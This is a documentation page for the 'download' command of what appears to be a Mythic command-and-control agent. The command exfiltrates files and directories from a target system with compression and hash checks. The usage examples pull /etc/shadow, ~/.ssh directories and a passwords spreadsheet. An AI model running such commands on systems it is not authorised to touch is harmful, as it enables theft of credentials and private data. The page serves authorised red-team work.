+++
title = "download"
chapter = false
weight = 103
hidden = false
+++

## Summary

Download a file or directory from the target system. Supports chunked file transfer for any file size. Files larger than 1MB are automatically gzip-compressed before transfer to reduce bandwidth. Includes SHA256 hash verification of transferred data. Integrates with the Mythic file browser.

When given a directory path, the command automatically creates a zip archive of the directory contents and downloads it. The zip file is created in a temp location and cleaned up after transfer.

### Arguments

#### path
Path to the file or directory to download.

#### compress (optional)
Boolean. Controls gzip compression for file transfers. Default: auto (enabled for files >1MB, disabled for smaller files). Directories always use zip compression regardless.

## Usage
```
download [path]
download {"path": "/file", "compress": true}
download {"path": "/file", "compress": false}
```

### Download a single file (auto-compress if >1MB)
```
download C:\Users\admin\Documents\passwords.xlsx
download /etc/shadow
```

### Download with explicit compression control
```
download {"path": "/var/log/syslog", "compress": true}
download {"path": "/tmp/already-compressed.tar.gz", "compress": false}
```

### Download an entire directory
```
download C:\Users\target\Documents
download /home/user/.ssh
```
The directory will be downloaded as `Documents.zip` or `.ssh.zip` respectively.

## Compression Details

- Files >1MB are automatically gzip-compressed before transfer
- If compression doesn't reduce size (e.g., already-compressed files), falls back to uncompressed transfer
- Compressed files are transferred with `.gz` extension
- Output includes original size, compressed size, and compression ratio
- SHA256 hash is computed on the original (uncompressed) file data

## Directory Download Details

- Recursively zips all files up to 10 levels deep
- Skips inaccessible files (no errors, silently omitted)
- Skips symlinks for safety
- Zip uses Deflate compression
- Temp zip is automatically removed after transfer
- Output includes file count and compression stats

## Integrity Verification

All file transfers include SHA256 hash computation:
- **Single files:** SHA256 of the original file content
- **Compressed files:** SHA256 of the original (pre-compression) content
- **Directories:** SHA256 of the zip archive

## MITRE ATT&CK Mapping

- **T1020** — Automated Exfiltration
- **T1030** — Data Transfer Size Limits
- **T1041** — Exfiltration Over C2 Channel
- **T1560.002** — Archive Collected Data: Archive via Library
